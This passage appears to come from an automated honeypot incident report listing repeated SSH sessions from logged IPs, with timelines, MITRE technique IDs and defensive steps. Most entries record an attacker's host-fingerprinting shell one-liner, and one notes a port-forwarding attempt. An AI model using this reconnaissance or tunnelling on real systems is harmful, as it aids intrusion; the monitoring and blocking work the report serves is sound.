| `2026-09-24 17:04:48` | `cowrie.command.input` |
| `2026-09-24 17:04:48` | `cowrie.command.input` |
| `2026-09-24 17:04:48` | `cowrie.command.input` |
| `2026-09-24 17:04:48` | `cowrie.command.input` |
| `2026-09-24 17:04:48` | `cowrie.command.input` |
| `2026-09-24 17:04:48` | `cowrie.command.success` |
| `2026-09-24 17:04:48` | `cowrie.command.input` |
| `2026-09-24 17:04:48` | `cowrie.command.input` |
| `2026-09-24 17:04:48` | `cowrie.command.input` |
| `2026-09-24 17:04:48` | `cowrie.command.input` |
| `2026-09-24 17:04:49` | `cowrie.log.closed` |
| `2026-09-24 17:04:50` | `cowrie.session.params` |
| `2026-09-24 17:04:50` | `cowrie.command.input` |
| `2026-09-24 17:04:50` | `cowrie.log.closed` |
| `2026-09-24 17:04:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6086adaedad7

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:06 |
| **Last Seen** | 2026-09-24 17:06 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:06:54` | `cowrie.session.connect` |
| `2026-09-24 17:06:54` | `cowrie.client.version` |
| `2026-09-24 17:06:54` | `cowrie.client.kex` |
| `2026-09-24 17:06:56` | `cowrie.login.success` |
| `2026-09-24 17:06:57` | `cowrie.session.params` |
| `2026-09-24 17:06:57` | `cowrie.command.input` |
| `2026-09-24 17:06:57` | `cowrie.command.input` |
| `2026-09-24 17:06:57` | `cowrie.command.input` |
| `2026-09-24 17:06:57` | `cowrie.command.input` |
| `2026-09-24 17:06:57` | `cowrie.command.input` |
| `2026-09-24 17:06:57` | `cowrie.command.success` |
| `2026-09-24 17:06:57` | `cowrie.command.input` |
| `2026-09-24 17:06:57` | `cowrie.command.input` |
| `2026-09-24 17:06:57` | `cowrie.command.input` |
| `2026-09-24 17:06:57` | `cowrie.command.input` |
| `2026-09-24 17:06:57` | `cowrie.log.closed` |
| `2026-09-24 17:06:58` | `cowrie.session.params` |
| `2026-09-24 17:06:58` | `cowrie.command.input` |
| `2026-09-24 17:06:59` | `cowrie.log.closed` |
| `2026-09-24 17:06:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b450b28ccdaf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:08 |
| **Last Seen** | 2026-09-24 17:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:08:57` | `cowrie.session.connect` |
| `2026-09-24 17:08:57` | `cowrie.client.version` |
| `2026-09-24 17:08:57` | `cowrie.client.kex` |
| `2026-09-24 17:08:58` | `cowrie.login.success` |
| `2026-09-24 17:09:00` | `cowrie.session.params` |
| `2026-09-24 17:09:00` | `cowrie.command.input` |
| `2026-09-24 17:09:00` | `cowrie.command.input` |
| `2026-09-24 17:09:00` | `cowrie.command.input` |
| `2026-09-24 17:09:00` | `cowrie.command.input` |
| `2026-09-24 17:09:00` | `cowrie.command.input` |
| `2026-09-24 17:09:00` | `cowrie.command.success` |
| `2026-09-24 17:09:00` | `cowrie.command.input` |
| `2026-09-24 17:09:00` | `cowrie.command.input` |
| `2026-09-24 17:09:00` | `cowrie.command.input` |
| `2026-09-24 17:09:00` | `cowrie.command.input` |
| `2026-09-24 17:09:00` | `cowrie.log.closed` |
| `2026-09-24 17:09:01` | `cowrie.session.params` |
| `2026-09-24 17:09:01` | `cowrie.command.input` |
| `2026-09-24 17:09:02` | `cowrie.log.closed` |
| `2026-09-24 17:09:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49418cf2b17c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:13 |
| **Last Seen** | 2026-09-24 17:13 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:13:00` | `cowrie.session.connect` |
| `2026-09-24 17:13:01` | `cowrie.client.version` |
| `2026-09-24 17:13:01` | `cowrie.client.kex` |
| `2026-09-24 17:13:02` | `cowrie.login.success` |
| `2026-09-24 17:13:03` | `cowrie.session.params` |
| `2026-09-24 17:13:03` | `cowrie.command.input` |
| `2026-09-24 17:13:03` | `cowrie.command.input` |
| `2026-09-24 17:13:03` | `cowrie.command.input` |
| `2026-09-24 17:13:03` | `cowrie.command.input` |
| `2026-09-24 17:13:03` | `cowrie.command.input` |
| `2026-09-24 17:13:03` | `cowrie.command.success` |
| `2026-09-24 17:13:03` | `cowrie.command.input` |
| `2026-09-24 17:13:03` | `cowrie.command.input` |
| `2026-09-24 17:13:03` | `cowrie.command.input` |
| `2026-09-24 17:13:03` | `cowrie.command.input` |
| `2026-09-24 17:13:03` | `cowrie.log.closed` |
| `2026-09-24 17:13:04` | `cowrie.session.params` |
| `2026-09-24 17:13:04` | `cowrie.command.input` |
| `2026-09-24 17:13:05` | `cowrie.log.closed` |
| `2026-09-24 17:13:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b6d767a058e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:14 |
| **Last Seen** | 2026-09-24 17:14 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:14:52` | `cowrie.session.connect` |
| `2026-09-24 17:14:52` | `cowrie.client.version` |
| `2026-09-24 17:14:52` | `cowrie.client.kex` |
| `2026-09-24 17:14:55` | `cowrie.login.success` |
| `2026-09-24 17:14:56` | `cowrie.session.params` |
| `2026-09-24 17:14:56` | `cowrie.command.input` |
| `2026-09-24 17:14:56` | `cowrie.command.input` |
| `2026-09-24 17:14:56` | `cowrie.command.input` |
| `2026-09-24 17:14:56` | `cowrie.command.input` |
| `2026-09-24 17:14:56` | `cowrie.command.input` |
| `2026-09-24 17:14:56` | `cowrie.command.success` |
| `2026-09-24 17:14:56` | `cowrie.command.input` |
| `2026-09-24 17:14:56` | `cowrie.command.input` |
| `2026-09-24 17:14:56` | `cowrie.command.input` |
| `2026-09-24 17:14:56` | `cowrie.command.input` |
| `2026-09-24 17:14:57` | `cowrie.log.closed` |
| `2026-09-24 17:14:58` | `cowrie.session.params` |
| `2026-09-24 17:14:58` | `cowrie.command.input` |
| `2026-09-24 17:14:59` | `cowrie.log.closed` |
| `2026-09-24 17:14:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a43358712d10

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:16 |
| **Last Seen** | 2026-09-24 17:16 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:16:37` | `cowrie.session.connect` |
| `2026-09-24 17:16:37` | `cowrie.client.version` |
| `2026-09-24 17:16:37` | `cowrie.client.kex` |
| `2026-09-24 17:16:39` | `cowrie.login.success` |
| `2026-09-24 17:16:40` | `cowrie.session.params` |
| `2026-09-24 17:16:40` | `cowrie.command.input` |
| `2026-09-24 17:16:40` | `cowrie.command.input` |
| `2026-09-24 17:16:40` | `cowrie.command.input` |
| `2026-09-24 17:16:40` | `cowrie.command.input` |
| `2026-09-24 17:16:40` | `cowrie.command.input` |
| `2026-09-24 17:16:40` | `cowrie.command.success` |
| `2026-09-24 17:16:40` | `cowrie.command.input` |
| `2026-09-24 17:16:40` | `cowrie.command.input` |
| `2026-09-24 17:16:40` | `cowrie.command.input` |
| `2026-09-24 17:16:40` | `cowrie.command.input` |
| `2026-09-24 17:16:41` | `cowrie.log.closed` |
| `2026-09-24 17:16:42` | `cowrie.session.params` |
| `2026-09-24 17:16:42` | `cowrie.command.input` |
| `2026-09-24 17:16:43` | `cowrie.log.closed` |
| `2026-09-24 17:16:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4651980ce5cc

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:18 |
| **Last Seen** | 2026-09-24 17:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:18:30` | `cowrie.session.connect` |
| `2026-09-24 17:18:30` | `cowrie.client.version` |
| `2026-09-24 17:18:30` | `cowrie.client.kex` |
| `2026-09-24 17:18:32` | `cowrie.login.success` |
| `2026-09-24 17:18:33` | `cowrie.session.params` |
| `2026-09-24 17:18:33` | `cowrie.command.input` |
| `2026-09-24 17:18:33` | `cowrie.command.input` |
| `2026-09-24 17:18:33` | `cowrie.command.input` |
| `2026-09-24 17:18:33` | `cowrie.command.input` |
| `2026-09-24 17:18:33` | `cowrie.command.input` |
| `2026-09-24 17:18:33` | `cowrie.command.success` |
| `2026-09-24 17:18:33` | `cowrie.command.input` |
| `2026-09-24 17:18:33` | `cowrie.command.input` |
| `2026-09-24 17:18:33` | `cowrie.command.input` |
| `2026-09-24 17:18:33` | `cowrie.command.input` |
| `2026-09-24 17:18:33` | `cowrie.log.closed` |
| `2026-09-24 17:18:35` | `cowrie.session.params` |
| `2026-09-24 17:18:35` | `cowrie.command.input` |
| `2026-09-24 17:18:35` | `cowrie.log.closed` |
| `2026-09-24 17:18:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e90895c1502

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 17:18 |
| **Last Seen** | 2026-09-24 17:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:18:57` | `cowrie.session.connect` |
| `2026-09-24 17:18:57` | `cowrie.client.version` |
| `2026-09-24 17:18:57` | `cowrie.client.kex` |
| `2026-09-24 17:18:58` | `cowrie.login.success` |
| `2026-09-24 17:18:58` | `cowrie.direct-tcpip.request` |
| `2026-09-24 17:18:58` | `cowrie.direct-tcpip.data` |
| `2026-09-24 17:18:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18f8ac6dfe32

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:20 |
| **Last Seen** | 2026-09-24 17:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:20:28` | `cowrie.session.connect` |
| `2026-09-24 17:20:28` | `cowrie.client.version` |
| `2026-09-24 17:20:28` | `cowrie.client.kex` |
| `2026-09-24 17:20:30` | `cowrie.login.success` |
| `2026-09-24 17:20:31` | `cowrie.session.params` |
| `2026-09-24 17:20:31` | `cowrie.command.input` |
| `2026-09-24 17:20:31` | `cowrie.command.input` |
| `2026-09-24 17:20:31` | `cowrie.command.input` |
| `2026-09-24 17:20:31` | `cowrie.command.input` |
| `2026-09-24 17:20:31` | `cowrie.command.input` |
| `2026-09-24 17:20:31` | `cowrie.command.success` |
| `2026-09-24 17:20:31` | `cowrie.command.input` |
| `2026-09-24 17:20:31` | `cowrie.command.input` |
| `2026-09-24 17:20:31` | `cowrie.command.input` |
| `2026-09-24 17:20:31` | `cowrie.command.input` |
| `2026-09-24 17:20:32` | `cowrie.log.closed` |
| `2026-09-24 17:20:33` | `cowrie.session.params` |
| `2026-09-24 17:20:33` | `cowrie.command.input` |
| `2026-09-24 17:20:33` | `cowrie.log.closed` |
| `2026-09-24 17:20:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb6387fdeef6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:22 |
| **Last Seen** | 2026-09-24 17:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:22:25` | `cowrie.session.connect` |
| `2026-09-24 17:22:26` | `cowrie.client.version` |
| `2026-09-24 17:22:26` | `cowrie.client.kex` |
| `2026-09-24 17:22:27` | `cowrie.login.success` |
| `2026-09-24 17:22:28` | `cowrie.session.params` |
| `2026-09-24 17:22:28` | `cowrie.command.input` |
| `2026-09-24 17:22:28` | `cowrie.command.input` |
| `2026-09-24 17:22:28` | `cowrie.command.input` |
| `2026-09-24 17:22:28` | `cowrie.command.input` |
| `2026-09-24 17:22:28` | `cowrie.command.input` |
| `2026-09-24 17:22:28` | `cowrie.command.success` |
| `2026-09-24 17:22:28` | `cowrie.command.input` |
| `2026-09-24 17:22:29` | `cowrie.command.input` |
| `2026-09-24 17:22:29` | `cowrie.command.input` |
| `2026-09-24 17:22:29` | `cowrie.command.input` |
| `2026-09-24 17:22:29` | `cowrie.log.closed` |
| `2026-09-24 17:22:31` | `cowrie.session.params` |
| `2026-09-24 17:22:31` | `cowrie.command.input` |
| `2026-09-24 17:22:31` | `cowrie.log.closed` |
| `2026-09-24 17:22:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d63ac77ab36e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:24 |
| **Last Seen** | 2026-09-24 17:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:24:16` | `cowrie.session.connect` |
| `2026-09-24 17:24:16` | `cowrie.client.version` |
| `2026-09-24 17:24:16` | `cowrie.client.kex` |
| `2026-09-24 17:24:18` | `cowrie.login.success` |
| `2026-09-24 17:24:19` | `cowrie.session.params` |
| `2026-09-24 17:24:19` | `cowrie.command.input` |
| `2026-09-24 17:24:19` | `cowrie.command.input` |
| `2026-09-24 17:24:19` | `cowrie.command.input` |
| `2026-09-24 17:24:19` | `cowrie.command.input` |
| `2026-09-24 17:24:19` | `cowrie.command.input` |
| `2026-09-24 17:24:19` | `cowrie.command.success` |
| `2026-09-24 17:24:19` | `cowrie.command.input` |
| `2026-09-24 17:24:19` | `cowrie.command.input` |
| `2026-09-24 17:24:19` | `cowrie.command.input` |
| `2026-09-24 17:24:19` | `cowrie.command.input` |
| `2026-09-24 17:24:20` | `cowrie.log.closed` |
| `2026-09-24 17:24:21` | `cowrie.session.params` |
| `2026-09-24 17:24:21` | `cowrie.command.input` |
| `2026-09-24 17:24:21` | `cowrie.log.closed` |
| `2026-09-24 17:24:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19e729b97087

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:26 |
| **Last Seen** | 2026-09-24 17:26 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 17:26:10` | `cowrie.session.connect` |
| `2026-09-24 17:26:10` | `cowrie.client.version` |
| `2026-09-24 17:26:10` | `cowrie.client.kex` |
| `2026-09-24 17:26:11` | `cowrie.login.success` |
| `2026-09-24 17:26:13` | `cowrie.session.params` |
| `2026-09-24 17:26:13` | `cowrie.command.input` |
| `2026-09-24 17:26:13` | `cowrie.command.input` |
| `2026-09-24 17:26:13` | `cowrie.command.input` |
| `2026-09-24 17:26:13` | `cowrie.command.input` |
| `2026-09-24 17:26:13` | `cowrie.command.input` |
| `2026-09-24 17:26:13` | `cowrie.command.success` |
| `2026-09-24 17:26:13` | `cowrie.command.input` |
| `2026-09-24 17:26:13` | `cowrie.command.input` |
| `2026-09-24 17:26:13` | `cowrie.command.input` |
| `2026-09-24 17:26:13` | `cowrie.command.input` |
| `2026-09-24 17:26:13` | `cowrie.log.closed` |
| `2026-09-24 17:26:14` | `cowrie.session.params` |
| `2026-09-24 17:26:14` | `cowrie.command.input` |
| `2026-09-24 17:26:15` | `cowrie.log.closed` |
| `2026-09-24 17:26:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f24e695fbd3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-24 17:28 |
| **Last Seen** | 2026-09-24 17:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
